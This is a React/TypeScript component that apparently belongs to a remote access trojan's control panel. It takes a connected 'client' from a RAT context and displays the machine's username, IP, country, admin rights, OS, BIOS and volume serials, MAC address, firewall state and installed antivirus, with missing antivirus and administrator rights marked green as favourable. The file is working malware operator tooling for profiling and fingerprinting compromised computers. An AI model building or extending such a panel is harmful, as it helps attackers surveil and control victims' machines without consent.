import { useContext, useEffect, useState } from "react";
import { fetchClientCmd } from "../rat/RATCommands";
import { RATContext } from "../rat/RATContext";
import { RATClient } from "../../types";
import {
  IconDeviceDesktop,
  IconUser,
  IconCpu,
  IconDeviceDesktopAnalytics,
  IconShieldCheck,
  IconDeviceSdCard,
  IconBrandWindows,
  IconBrandUbuntu,
  IconAlertCircle,
  IconMapPin,
  IconNetwork,
  IconBrandGooglePodcasts,
  IconFingerprint,
} from "@tabler/icons-react";
import { useParams } from "react-router-dom";

export const ClientInfo = () => {
  const { addr } = useParams();
  const { getClientByAddr, clientList } = useContext(RATContext)!;

  const [client, setClient] = useState<RATClient | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState<boolean>(true);

  useEffect(() => {
    const fetchClientInfo = async () => {
      if (addr) {
        setLoading(true);
        setError(null);

        try {
          console.log("Fetching client info for", addr);
          console.log("Current client list:", clientList);

          // First try to get from context
          const clientData = await getClientByAddr(addr);

          if (clientData) {
            console.log("Client found in context:", clientData);
            setClient(clientData);
            setLoading(false);
            return;
          }

          // If not found in context, try direct fetch
          console.log("Client not found in context, trying direct fetch");
          try {
            const directClient = await fetchClientCmd(addr);
            if (directClient) {
              console.log("Client fetched directly:", directClient);
              setClient(directClient);
              setLoading(false);
              return;
            }
          } catch (fetchError) {
            console.error("Direct client fetch failed:", fetchError);
          }

          setError("Client not found. It may be disconnected or invalid.");
          setLoading(false);
        } catch (error) {
          console.error("Error fetching client info:", error);
          setError("Failed to load client information");
          setLoading(false);
        }
      }
    };

    fetchClientInfo();
  }, [addr, getClientByAddr, clientList]);

  // Helper to determine OS icon
  const getOsIcon = () => {
    if (!client)
      return <IconDeviceDesktop size={20} className="text-gray-400" />;

    if (client.system.os_full_name.toLowerCase().includes("windows")) {
      return <IconBrandWindows size={20} className="text-blue-400" />;
    } else if (
      client.system.os_full_name.toLowerCase().includes("linux") ||
      client.system.os_full_name.toLowerCase().includes("ubuntu")
    ) {
      return <IconBrandUbuntu size={20} className="text-orange-400" />;
    } else {
      return <IconDeviceDesktop size={20} className="text-gray-400" />;
    }
  };

  // Get country flag SVG path based on country code
  const getCountryFlagPath = (countryCode: string) => {
    if (!countryCode || countryCode === "N/A") return "";
    const code = countryCode.toLowerCase();
    return `/country_flags/${code}.svg`;
  };

  if (loading) {
    return (
      <div className="flex items-center justify-center h-screen bg-secondarybg text-white">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-accentx mx-auto"></div>
          <p className="mt-4">Loading client information...</p>
        </div>
      </div>
    );
  }

  if (error || !client) {
    return (
      <div className="flex items-center justify-center h-screen bg-secondarybg text-white">
        <div className="text-center max-w-md p-6 bg-primarybg rounded-lg">
          <IconAlertCircle size={48} className="text-red-400 mx-auto mb-4" />
          <h2 className="text-xl font-bold mb-2">Unable to Load Client</h2>
          <p className="text-gray-300 mb-4">
            {error || "Client information is not available"}
          </p>
          <p className="text-sm text-gray-400">
            This may occur if the client has disconnected or if the address is
            invalid.
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="bg-secondarybg text-white min-h-screen">
      {/* Sticky Header */}
      <div className="sticky top-0 z-10 bg-secondarybg border-b border-gray-700 pb-3 pt-4 px-4">
        <h1 className="text-2xl font-bold flex items-center gap-2">
          {getOsIcon()}
          <span>
            {client.system.username}@{client.system.machine_name}
          </span>
        </h1>
        <p className="text-gray-400 text-sm mt-1">{client.data.addr}</p>
      </div>

      {/* Main Content - Single Column */}
      <div className="max-w-4xl mx-auto space-y-4 p-4 pt-6">
        {/* Connection info */}
        <div className="bg-primarybg rounded-lg p-4">
          <h3 className="text-accentx font-semibold mb-3 text-sm flex items-center gap-1">
            <IconNetwork size={16} />
            CONNECTION
          </h3>
          <div className="grid grid-cols-2 gap-3">
            <div>
              <div className="text-xs text-gray-400">Address</div>
              <div className="font-mono text-sm">{client.data.addr}</div>
            </div>
            <div>
              <div className="text-xs text-gray-400">Group</div>
              <div className="text-sm">{client.data.group}</div>
            </div>
          </div>
        </div>

        {/* User info */}
        <div className="bg-primarybg rounded-lg p-4">
          <h3 className="text-accentx font-semibold mb-3 text-sm flex items-center gap-1">
            <IconUser size={16} />
            <span>USER</span>
          </h3>
          <div className="grid grid-cols-2 gap-3">
            <div>
              <div className="text-xs text-gray-400">Username</div>
              <div className="text-sm">{client.system.username}</div>
            </div>
            <div>
              <div className="text-xs text-gray-400">Privileges</div>
              <div className="text-sm flex items-center gap-1">
                {client.system.is_elevated ? (
                  <>
                    <span className="text-green-400">Administrator</span>
                    <IconShieldCheck size={16} className="text-green-400" />
                  </>
                ) : (
                  <span className="text-gray-300">Standard User</span>
                )}
              </div>
            </div>
          </div>
        </div>

        {/* Location info */}
        <div className="bg-primarybg rounded-lg p-4">
          <h3 className="text-accentx font-semibold mb-3 text-sm flex items-center gap-1">
            <IconMapPin size={16} />
            <span>LOCATION</span>
          </h3>
          <div>
            <div className="text-xs text-gray-400">Country</div>
            <div className="text-sm">
              {client.data.country_code &&
              client.data.country_code !== "N/A" ? (
                <div className="flex items-center gap-2">
                  <img
                    src={getCountryFlagPath(client.data.country_code)}
                    alt={client.data.country_code}
                    className="w-6 h-4 object-cover"
                  />
                  <span>{client.data.country_code}</span>
                </div>
              ) : (
                "N/A"
              )}
            </div>
          </div>
        </div>

        {/* System info */}
        <div className="bg-primarybg rounded-lg p-4">
          <h3 className="text-accentx font-semibold mb-3 text-sm flex items-center gap-1">
            <IconDeviceDesktopAnalytics size={16} />
            <span>SYSTEM</span>
          </h3>
          <div className="space-y-3">
            <div>
              <div className="text-xs text-gray-400">Machine Name</div>
              <div className="text-sm">{client.system.machine_name}</div>
            </div>
            <div>
              <div className="text-xs text-gray-400">Model</div>
              <div className="text-sm">{client.system.system_model}</div>
            </div>
            <div>
              <div className="text-xs text-gray-400">Manufacturer</div>
              <div className="text-sm">{client.system.system_manufacturer}</div>
            </div>
            <div>
              <div className="text-xs text-gray-400">Operating System</div>
              <div className="text-sm flex items-center gap-1">
                {getOsIcon()}
                <span>{client.system.os_full_name}</span>
              </div>
            </div>
            <div>
              <div className="text-xs text-gray-400">OS Version</div>
              <div className="text-sm">{client.system.os_version}</div>
            </div>
            <div>
              <div className="text-xs text-gray-400">OS Serial</div>
              <div className="text-sm font-mono">
                {client.system.os_serial_number}
              </div>
            </div>
          </div>
        </div>

        {/* BIOS info */}
        <div className="bg-primarybg rounded-lg p-4">
          <h3 className="text-accentx font-semibold mb-3 text-sm flex items-center gap-1">
            <IconBrandGooglePodcasts size={16} />
            BIOS
          </h3>
          <div className="space-y-3">
            <div>
              <div className="text-xs text-gray-400">Manufacturer</div>
              <div className="text-sm">{client.bios.manufacturer}</div>
            </div>
            <div>
              <div className="text-xs text-gray-400">Description</div>
              <div className="text-sm">{client.bios.description}</div>
            </div>
            <div>
              <div className="text-xs text-gray-400">Version</div>
              <div className="text-sm">{client.bios.version}</div>
            </div>
            <div>
              <div className="text-xs text-gray-400">Serial Number</div>
              <div className="text-sm font-mono">
                {client.bios.serial_number}
              </div>
            </div>
          </div>
        </div>

        {/* Hardware info */}
        <div className="bg-primarybg rounded-lg p-4">
          <h3 className="text-accentx font-semibold mb-3 text-sm flex items-center gap-1">
            <IconCpu size={16} />
            <span>HARDWARE</span>
          </h3>
          <div className="space-y-4">
            <div>
              <div className="text-xs text-gray-400 mb-1">CPU</div>
              <div className="text-sm space-y-1">
                <div>{client.cpu.cpu_name}</div>
                <div className="text-xs text-gray-400">
                  {client.cpu.logical_processors} Logical Processors •{" "}
                  {client.cpu.clock_speed_mhz} MHz
                </div>
                {client.cpu.manufacturer && (
                  <div className="text-xs text-gray-400">
                    Manufacturer: {client.cpu.manufacturer}
                  </div>
                )}
              </div>
            </div>

            <div>
              <div className="text-xs text-gray-400 mb-1">RAM</div>
              <div className="text-sm">
                Total: {client.ram.total_gb.toFixed(2)} GB • Used:{" "}
                {client.ram.used_gb.toFixed(2)} GB
              </div>
            </div>

            <div>
              <div className="text-xs text-gray-400 mb-1">GPUs</div>
              <div className="text-sm">
                {client.gpus.map((gpu, index) => (
                  <div key={index} className="mb-1">
                    {gpu.name}
                    {gpu.driver_version && (
                      <span className="text-xs text-gray-400 ml-2">
                        Driver: {gpu.driver_version}
                      </span>
                    )}
                  </div>
                ))}
              </div>
            </div>

            <div>
              <div className="text-xs text-gray-400 mb-1">Storage</div>
              <div className="text-sm">
                {client.drives.map((drive, index) => (
                  <div key={index} className="flex items-center gap-1 mb-1">
                    <IconDeviceSdCard size={16} className="text-amber-300" />
                    <span>
                      {drive.model} ({drive.size_gb.toFixed(2)} GB)
                    </span>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>

        {/* Unique Identifiers */}
        <div className="bg-primarybg rounded-lg p-4">
          <h3 className="text-accentx font-semibold mb-3 text-sm flex items-center gap-1">
            <IconFingerprint size={16} />
            UNIQUE IDENTIFIERS
          </h3>
          <div className="space-y-3">
            <div>
              <div className="text-xs text-gray-400">MAC Address</div>
              <div className="text-sm font-mono">
                {client.unique.mac_address}
              </div>
            </div>
            <div>
              <div className="text-xs text-gray-400">Volume Serial</div>
              <div className="text-sm font-mono">
                {client.unique.volume_serial}
              </div>
            </div>
          </div>
        </div>

        {/* Security info */}
        <div className="bg-primarybg rounded-lg p-4">
          <h3 className="text-accentx font-semibold mb-3 text-sm flex items-center gap-1">
            <IconShieldCheck size={16} />
            <span>SECURITY</span>
          </h3>
          <div className="space-y-3">
            <div>
              <div className="text-xs text-gray-400">Firewall</div>
              <div className="text-sm">
                {client.security.firewall_enabled ? (
                  <span className="text-green-400">Enabled</span>
                ) : (
                  <span className="text-red-400">Disabled</span>
                )}
              </div>
            </div>
            <div>
              <div className="text-xs text-gray-400">Installed Antivirus</div>
              {client.security.antivirus_names.length > 0 ? (
                <div className="text-sm">
                  {client.security.antivirus_names.map((av, index) => (
                    <div key={index} className="text-amber-300">
                      {av}
                    </div>
                  ))}
                </div>
              ) : (
                <div className="text-sm text-green-400">
                  No antivirus detected
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
